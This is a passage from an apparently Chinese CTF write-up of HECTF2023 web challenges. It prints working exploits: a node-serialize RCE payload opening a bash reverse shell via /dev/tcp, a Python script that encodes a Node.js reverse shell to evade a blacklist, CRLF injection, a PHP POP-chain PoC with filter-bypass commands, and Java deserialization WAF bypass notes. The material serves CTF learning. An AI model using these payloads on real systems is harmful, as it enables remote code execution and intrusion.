nikename);&#125;</code></pre></div><p>只能污染ctfer的属性，所以做题无脑污染就行，这里我们具体测试一下</p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114200325556.png" alt="image-20240114200325556"></p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114200545913.png" alt="image-20240114200545913"></p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114200706074.png" alt="image-20240114200706074"></p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114200800797.png" alt="image-20240114200800797"></p><p>所以污染哪一个都行</p><p>拼凑出来就是官方wp了</p><p>给出官方wp</p><blockquote><p><strong>通过给的附件和第三方库版本，推断利用undefsafe造成原型链污染</strong></p><p><strong>但是后面是一个序列化</strong></p><h5 id="CVE-2017-5941-利用Node-js反序列化漏洞执行远程代码"><a href="#CVE-2017-5941-利用Node-js反序列化漏洞执行远程代码" class="headerlink" title="CVE-2017-5941: 利用Node.js反序列化漏洞执行远程代码"></a>CVE-2017-5941: 利用Node.js反序列化漏洞执行远程代码</h5><div class="code-wrapper"><pre><code class="hljs routeros"><span class="hljs-attribute">id</span>=__proto__.sc&amp;name=&#123;<span class="hljs-string">&quot;rce&quot;</span>%3a<span class="hljs-string">&quot;_$<span class="hljs-variable">$ND_FUNC</span>$<span class="hljs-variable">$_function</span>()&#123;require(&#x27;child_process&#x27;).exec(&#x27;bash+-c+\&quot;bash+-i+&gt;%26+/dev/tcp/ip/4444+0&gt;%261\&quot;&#x27;,function(error,stdout,+stderr)+&#123;+console.log(stdout)+&#125;)%3b\n+&#125;()&quot;</span>&#125;&amp;<span class="hljs-attribute">nickname</span>=5</code></pre></div><p><strong>但是有黑名单过滤了一些命令执行函数</strong></p><p>**python shell.py  ip 端口,生成String.fromCharCode的字符即可绕过 ** </p><div class="code-wrapper"><pre><code class="hljs stata">import sys<span class="hljs-keyword">if</span> len(sys.argv) != 3:    <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Usage: %s &lt;LHOST&gt; &lt;LPORT&gt;&quot;</span> % (sys.argv[0])    sys.<span class="hljs-keyword">exit</span>(0)IP_ADDR = sys.argv[1]PORT = sys.argv[2]def charencode(string):    <span class="hljs-string">&quot;&quot;</span><span class="hljs-string">&quot;String.CharCode&quot;</span><span class="hljs-string">&quot;&quot;</span>    encoded = &#x27;&#x27;    <span class="hljs-keyword">for</span> <span class="hljs-keyword">char</span> <span class="hljs-keyword">in</span> string:        encoded = encoded + <span class="hljs-string">&quot;,&quot;</span> + str(ord(<span class="hljs-keyword">char</span>))    <span class="hljs-keyword">return</span> encoded[1:]<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;[+] LHOST = %s&quot;</span> % (IP_ADDR)<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;[+] LPORT = %s&quot;</span> % (PORT)NODEJS_REV_SHELL = &#x27;&#x27;&#x27;<span class="hljs-keyword">var</span> <span class="hljs-keyword">net</span> = require(&#x27;<span class="hljs-keyword">net</span>&#x27;);<span class="hljs-keyword">var</span> spawn = require(&#x27;child_process&#x27;).spawn;HOST=<span class="hljs-string">&quot;%s&quot;</span>;PORT=<span class="hljs-string">&quot;%s&quot;</span>;TIMEOUT=<span class="hljs-string">&quot;5000&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-keyword">typeof</span> String.prototype.contains === &#x27;undefined&#x27;) &#123; String.prototype.contains = function(it) &#123; <span class="hljs-keyword">return</span> this.indexOf(it) != -1; &#125;; &#125;function c(HOST,PORT) &#123;    <span class="hljs-keyword">var</span> client = new <span class="hljs-keyword">net</span>.Socket();    client.connect(PORT, HOST, function() &#123;        <span class="hljs-keyword">var</span> <span class="hljs-keyword">sh</span> = spawn(&#x27;/bin/<span class="hljs-keyword">sh</span>&#x27;,[]);        client.write(<span class="hljs-string">&quot;Connected!\\n&quot;</span>);        client.pipe(<span class="hljs-keyword">sh</span>.stdin);        <span class="hljs-keyword">sh</span>.stdout.pipe(client);        <span class="hljs-keyword">sh</span>.stderr.pipe(client);        <span class="hljs-keyword">sh</span>.<span class="hljs-keyword">on</span>(&#x27;<span class="hljs-keyword">exit</span>&#x27;,function(code,signal)&#123;          client.end(<span class="hljs-string">&quot;Disconnected!\\n&quot;</span>);       &#125;);   &#125;);    client.<span class="hljs-keyword">on</span>(&#x27;<span class="hljs-keyword">error</span>&#x27;, function(<span class="hljs-keyword">e</span>) &#123;        setTimeout(c(HOST,PORT), TIMEOUT);   &#125;);&#125;c(HOST,PORT);&#x27;&#x27;&#x27; % (IP_ADDR, PORT)<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;[+] Encoding&quot;</span>PAYLOAD = charencode(NODEJS_REV_SHELL)<span class="hljs-keyword">print</span> <span class="hljs-string">&quot;eval(String.fromCharCode(%s))&quot;</span> % (PAYLOAD)</code></pre></div><p><strong>访问&#x2F;edit路由污染参数，最后访问&#x2F;excite进行执行</strong></p><p><code>&#123;&quot;rce&quot;:&quot;_$$ND_FUNC$$_function ()&#123; eval(String.fromCharCode(10,118,97,...))&#125;()&quot;&#125;</code></p></blockquote><h3 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h3><div class="code-wrapper"><pre><code class="hljs javascript">app.<span class="hljs-title function_">route</span>(<span class="hljs-string">&#x27;/getflag&#x27;</span>) .<span class="hljs-title function_">get</span>(<span class="hljs-keyword">function</span> (<span class="hljs-params">req, res</span>) &#123;    <span class="hljs-keyword">let</span> array1=&#123;<span class="hljs-attr">IIS</span>:<span class="hljs-number">123</span>,<span class="hljs-attr">a</span>:<span class="hljs-number">234</span>,<span class="hljs-attr">b</span>:<span class="hljs-number">345</span>&#125;    <span class="hljs-keyword">let</span> q = req.<span class="hljs-property">query</span>.<span class="hljs-property">q</span>;    <span class="hljs-keyword">if</span>(<span class="hljs-title function_">black1</span>(q))&#123;        <span class="hljs-keyword">if</span>(array1[q.<span class="hljs-title function_">toUpperCase</span>()]==<span class="hljs-number">123</span>)&#123;            res.<span class="hljs-title function_">render</span>(<span class="hljs-string">&#x27;mess&#x27;</span>, &#123;            <span class="hljs-attr">message</span>: flag        &#125;);        &#125;    &#125;&#125;)</code></pre></div><div class="code-wrapper"><pre><code class="hljs javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">black1</span>(<span class="hljs-params">arr</span>) &#123;    <span class="hljs-keyword">let</span> blacklist = [<span class="hljs-string">&quot;s&quot;</span>, <span class="hljs-string">&quot;S&quot;</span>, <span class="hljs-string">&quot;i&quot;</span>,<span class="hljs-string">&quot;I&quot;</span>];    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; arr.<span class="hljs-property">length</span>; i++) &#123;        <span class="hljs-keyword">const</span> element = arr[i];        <span class="hljs-keyword">if</span> (blacklist.<span class="hljs-title function_">includes</span>(element)) &#123;            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;        &#125;    &#125;    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;&#125;</code></pre></div><p>这里的判断条件是<code>array1[q.toUpperCase()]==123</code>，把array1当成数组来处理了，但是array1只是一个对象，所以这个判断永远不成立，</p><p>woc，夸张</p><h2 id="懒洋洋"><a href="#懒洋洋" class="headerlink" title="懒洋洋"></a>懒洋洋</h2><p>唉，没话说</p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114215546120.png" alt="image-20240114215546120"></p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114215620645.png" alt="image-20240114215620645"></p><p>端口：7777     头指请求头，说明要利用CRLF漏洞</p><div class="code-wrapper"><pre><code class="hljs llvm">/eeeqxxtg?url<span class="hljs-operator">=</span>http://<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">7777</span>/?a<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-variable">%20</span>HTTP/<span class="hljs-number">1.1</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>aflag:<span class="hljs-variable">%20</span>ctfer<span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>aTEST:<span class="hljs-variable">%20123</span><span class="hljs-variable">%0</span>d<span class="hljs-variable">%0</span>a</code></pre></div><p><strong>Hint：请参考官网上的验证代码格式，并通过并发绕过某些东西</strong></p><p>这个hint不知道什么意思</p><h2 id="伪装者"><a href="#伪装者" class="headerlink" title="伪装者"></a>伪装者</h2><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114220207330.png" alt="image-20240114220207330"></p><p>前三个是基础的HTTP请求头，但我卡在了Firefox的User-Agent</p><p>开始我以为是要像chrome一样长条的user-agent，网上查了后行不通，然后也尝试输入<code>firefox</code>，也不行</p><p>结果就是<code>Firefox</code>   。。。。。挺无语的</p><p>接下来经过测试是要session伪造一个<code>zxk1ing</code>用户</p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114220546866.png" alt="image-20240114220546866"></p><p>给了key</p><p>伪造完后</p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114220625759.png" alt="image-20240114220625759"></p><p>利用ssrf访问路由获取flag</p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114220747822.png" alt="image-20240114220747822"></p><p>file伪协议也可以</p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114220737922.png" alt="image-20240114220737922"></p><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114221009492.png" alt="image-20240114221009492"></p><p>进入题目，f12提示post_me_your_guess，响应头里发现Guess: which rand()?，cookie中发现seed（不同靶机的seed不同）</p><p>应该是要我们爆破随机数，因为给了seed，先写一个脚本生成随机数的字典</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">// 设置种子</span><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">331061946</span>);<span class="hljs-comment">// 生成随机数并保存为1.txt</span><span class="hljs-variable">$file</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>, <span class="hljs-string">&#x27;w&#x27;</span>);<span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">50</span>; <span class="hljs-variable">$i</span>++) &#123;    <span class="hljs-variable">$randomNumber</span> = <span class="hljs-title function_ invoke__">mt_rand</span>();    <span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$file</span>, <span class="hljs-variable">$randomNumber</span> . PHP_EOL);&#125;<span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$file</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;随机数已保存到1.txt文件中。&#x27;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">1442660857</span>); <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;<span class="hljs-number">1000</span>;<span class="hljs-variable">$i</span>++)&#123;     <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;\n&quot;</span>; &#125;</code></pre></div><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114221136049.png" alt="image-20240114221136049"></p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GGbond</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$candy</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>,<span class="hljs-variable">$arg</span></span>)</span>&#123;        <span class="hljs-variable">$func</span>(<span class="hljs-variable">$arg</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;candy-&gt;str;    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">unser</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$auth</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span>,<span class="hljs-variable">$name</span></span>)</span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;obj = <span class="hljs-variable">$obj</span>;        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;auth = <span class="hljs-variable">$name</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-variable language_">$this</span>-&gt;obj-&gt;<span class="hljs-title function_ invoke__">Welcome</span>();    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HECTF</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;cmd)&#123;            <span class="hljs-variable language_">$this</span>-&gt;cmd = <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&quot;/ls|cat|tac|more|sort|head|tail|nl|less|flag|cd|tee|bash|sh|&amp;|^|&gt;|&lt;|\.| |&#x27;|`|\(|\&quot;/i&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$this</span>-&gt;cmd);        &#125;        <span class="hljs-title function_ invoke__">exec</span>(<span class="hljs-variable">$this</span>-&gt;cmd);    &#125;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">heeectf</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span> = <span class="hljs-string">&quot;Welcome&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$auth</span> = <span class="hljs-string">&quot;who are you?&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Welcome</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;auth)==<span class="hljs-string">&quot;zxk1ing&quot;</span>)&#123;            <span class="hljs-variable">$star</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$this</span>-&gt;obj,<span class="hljs-string">&quot;⭐&quot;</span>,<span class="hljs-string">&quot;⭐&quot;</span>,<span class="hljs-string">&quot;⭐&quot;</span>,<span class="hljs-string">&quot;⭐&quot;</span>,<span class="hljs-string">&quot;⭐&quot;</span>));            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$star</span>;        &#125;        <span class="hljs-keyword">else</span>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome HECTF! Have fun!&#x27;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$get</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$func</span> = <span class="hljs-variable language_">$this</span>-&gt;flag;        <span class="hljs-keyword">return</span> <span class="hljs-variable">$func</span>();    &#125;&#125;<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">unser</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">heeectf</span>(),<span class="hljs-string">&quot;user&quot;</span>);<span class="hljs-variable">$data</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;data&#x27;</span>];<span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/flag/i&#x27;</span>,<span class="hljs-variable">$data</span>))    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$data</span>);<span class="hljs-keyword">else</span>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;想干嘛？？？&quot;</span>;</code></pre></div><div class="code-wrapper"><pre><code class="hljs kotlin"><span class="hljs-keyword">public</span> function __invoke()&#123;    <span class="hljs-keyword">if</span>($<span class="hljs-keyword">this</span>-&gt;cmd)&#123;        $<span class="hljs-keyword">this</span>-&gt;cmd = preg_replace(<span class="hljs-string">&quot;/ls|cat|tac|more|sort|head|tail|nl|less|flag|cd|tee|bash|sh|&amp;|^|&gt;|&lt;|\.| |&#x27;|`|\(|\&quot;/i&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,$<span class="hljs-keyword">this</span>-&gt;cmd);    &#125;    exec($<span class="hljs-keyword">this</span>-&gt;cmd);&#125;</code></pre></div><p>这种置空的匹配是最垃圾的，直接双写绕过</p><div class="code-wrapper"><pre><code class="hljs haskell"><span class="hljs-title">if</span>(!preg_match(&#x27;/flag/i&#x27;,$<span class="hljs-class"><span class="hljs-keyword">data</span>))</span>    unserialize($<span class="hljs-class"><span class="hljs-keyword">data</span>);</span></code></pre></div><p>序列化的数据不能有flag</p><p>那就是用大写S的十六进制绕过<code>S:4:&quot;fla\67&quot;</code></p><p>pop链不说了（最近感觉要么直接看出来，要么就转个弯就行，就不太想说了）</p><p><code>unser::__destruct -&gt; GGBond::__call -&gt; heeectf::Welcome -&gt; GGbond::__toString -&gt; heeectf::__get -&gt; HECTF::__invoke</code></p><p>值得一提的是</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Welcome</span>(<span class="hljs-params"></span>)</span>&#123;    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$this</span>-&gt;auth)==<span class="hljs-string">&quot;zxk1ing&quot;</span>)&#123;        <span class="hljs-variable">$star</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-keyword">array</span>(<span class="hljs-variable">$this</span>-&gt;obj,<span class="hljs-string">&quot;⭐&quot;</span>,<span class="hljs-string">&quot;⭐&quot;</span>,<span class="hljs-string">&quot;⭐&quot;</span>,<span class="hljs-string">&quot;⭐&quot;</span>,<span class="hljs-string">&quot;⭐&quot;</span>));        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$star</span>;    &#125;    <span class="hljs-keyword">else</span>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Welcome HECTF! Have fun!&#x27;</span>;&#125;</code></pre></div><p><code>obj</code>会被当作字符串被<code>echo</code>，可以触发<code>__toString</code></p><p>因此也要满足<code>unserialize($this-&gt;auth)==&quot;zxk1ing&quot;</code>这个式子</p><p>看了下wp，发现直接构造就行了     <code>s:7:&quot;zxk1ing&quot;;</code></p><p>别人的poc</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GGbond</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$candy</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">unser</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$auth</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HECTF</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$cmd</span>=<span class="hljs-string">&#x27;cacatt$&#123;IFS&#125;/f*|tteeee$&#123;IFS&#125;2&#x27;</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">heeectf</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$obj</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$flag</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$auth</span> = <span class="hljs-string">&#x27;s:7:&quot;zxk1ing&quot;;&#x27;</span>;&#125;<span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">unser</span>();<span class="hljs-variable">$a</span>-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">heeectf</span>();<span class="hljs-variable">$a</span>-&gt;obj-&gt;obj=<span class="hljs-keyword">new</span> <span class="hljs-title class_">GGbond</span>();<span class="hljs-variable">$a</span>-&gt;obj-&gt;obj-&gt;candy=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">heeectf</span>();<span class="hljs-variable">$a</span>-&gt;obj-&gt;obj-&gt;candy-&gt;flag=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">HECTF</span>();<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/s:4:&quot;flag&quot;/&#x27;</span>,<span class="hljs-string">&#x27;S:4:&quot;fla\\\67&quot;&#x27;</span>,<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));</code></pre></div><h2 id="DeserializationAttack"><a href="#DeserializationAttack" class="headerlink" title="DeserializationAttack"></a>DeserializationAttack</h2><p>接下来两道java才是重头戏</p><p>出题人本意是黑盒测试，后台模拟了个waf，限制长度和反序列化数据开头不能是字母数字和空格，最后还是给出了源码</p><div class="code-wrapper"><pre><code class="hljs kotlin"><span class="hljs-keyword">package</span> com.butler.deserializationattack.myController;<span class="hljs-keyword">import</span> java.io.IOException;<span class="hljs-keyword">import</span> org.apache.shiro.codec.Base64;<span class="hljs-keyword">import</span> org.apache.shiro.io.DefaultSerializer;<span class="hljs-keyword">import</span> org.springframework.stereotype.Controller;<span class="hljs-keyword">import</span> org.springframework.ui.Model;<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.RequestMapping;<span class="hljs-keyword">import</span> org.springframework.web.bind.<span class="hljs-keyword">annotation</span>.RequestParam;<span class="hljs-meta">@Controller</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HECTFController</span> &#123;    <span class="hljs-keyword">public</span> HECTFController() &#123;    &#125;    <span class="hljs-meta">@RequestMapping</span>    <span class="hljs-keyword">public</span> String index(<span class="hljs-meta">@RequestParam(name = <span class="hljs-string">&quot;data&quot;</span>,required = false)</span> String <span class="hljs-keyword">data</span>, Model model) throws IOException, ClassNotFoundException &#123;        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">data</span> != <span class="hljs-literal">null</span>) &#123;            Integer length = <span class="hljs-keyword">data</span>.length();            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">data</span>.length());            <span class="hljs-keyword">if</span> (startsWithDigitOrLetter(<span class="hljs-keyword">data</span>) &amp;&amp; length &gt; <span class="hljs-number">1000</span>) &#123;                model.addAttribute(<span class="hljs-string">&quot;result&quot;</span>, <span class="hljs-string">&quot;You are being blocked by the WAF (Web Application Firewall).&quot;</span>);                <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;            &#125;            System.<span class="hljs-keyword">out</span>.println(<span class="hljs-keyword">data</span>.length());            byte[] decode = Base64.decode(<span class="hljs-keyword">data</span>);            DefaultSerializer defaultSerializer = new DefaultSerializer();            defaultSerializer.deserialize(decode);        &#125;        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;index&quot;</span>;    &#125;    <span class="hljs-keyword">public</span> static boolean startsWithDigitOrLetter(String <span class="hljs-keyword">data</span>) &#123;        String regex = <span class="hljs-string">&quot;^[A-Za-z0-9 ].*&quot;</span>;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">data</span>.matches(regex);    &#125;&#125;</code></pre></div><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114225257607.png" alt="image-20240114225257607"></p><p>出题人的idea解析出来的是两个if语句，</p><p>而我的是一个</p><div class="code-wrapper"><pre><code class="hljs haskell"><span class="hljs-title">if</span> (startsWithDigitOrLetter(<span class="hljs-class"><span class="hljs-keyword">data</span>) &amp;&amp; length &gt; 1000) &#123;</span><span class="hljs-class"><span class="hljs-title">model</span>.<span class="hljs-title">addAttribute</span>(&quot;<span class="hljs-title">result</span>&quot;, &quot;<span class="hljs-type">You</span> <span class="hljs-title">are</span> <span class="hljs-title">being</span> <span class="hljs-title">blocked</span> <span class="hljs-title">by</span> <span class="hljs-title">the</span> <span class="hljs-type">WAF</span> (<span class="hljs-type">Web</span> <span class="hljs-type">Application</span> <span class="hljs-type">Firewall</span>).&quot;);</span><span class="hljs-class"><span class="hljs-title">return</span> &quot;<span class="hljs-title">index</span>&quot;;</span><span class="hljs-class">&#125;</span></code></pre></div><p>如果是两个if语句的话，wp中就不可能使用URLDNS进行探测</p><p>按照一个if语句的话，URLDNS中<code>startsWithDigitOrLetter(data)</code>为<code>true</code>，<code>length &gt; 1000</code>为<code>false</code></p><p>于是执行后面的<code>deserialize</code></p><p>并且wp后面的payload令<code>startsWithDigitOrLetter(data)</code>为<code>false</code>，<code>length &gt; 1000</code>为<code>true</code>同样能够执行后面的<code>deserialize</code></p><p>综上应该是只有一个if语句</p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114224924210.png" alt="image-20240114224924210"></p><h3 id="绕过WAF"><a href="#绕过WAF" class="headerlink" title="绕过WAF"></a>绕过WAF</h3><p>这里有个细节</p><div class="code-wrapper"><pre><code class="hljs abnf">import org.apache.shiro.codec.Base64<span class="hljs-comment">;</span></code></pre></div><p>后端是用shiro的base64来做解码的</p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114231128989.png" alt="image-20240114231128989"></p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114231144224.png" alt="image-20240114231144224"></p><p>如果对某个字节的<code>isBase64</code>判断结果为false，则不会将其添加到数组<code>groomeData</code>中。</p><p><img src="/../images/HECTF2023-web%E5%A4%8D%E7%8E%B0/image-20240114231155870.png" alt="image-20240114231155870"></p><p>isBase64方法的内容如下：所以只要我们让<code>base64Alphabet[octect]==-1</code>则可以不进入加密数组中，<code>octect</code>是ascii码值</p><p>下面是<code>base64Alphabet</code>的数据（只给出前一些）</p><div class="code-wrapper"><pre><code class="hljs basic"><span class="hljs-symbol">0 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">1 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">2 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">3 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">4 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">5 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">6 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">7 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">8 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">9 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">10 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">11 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">12 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">13 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">14 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">15 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">16 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">17 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">18 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">19 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">20 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">21 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">22 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">23 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">24 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">25 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">26 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">27 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">28 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">29 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">30 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">31 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">32 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">33 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">34 </span>= -<span class="hljs-number">1</span><span class="hljs-symbol">35 </span>= -<span 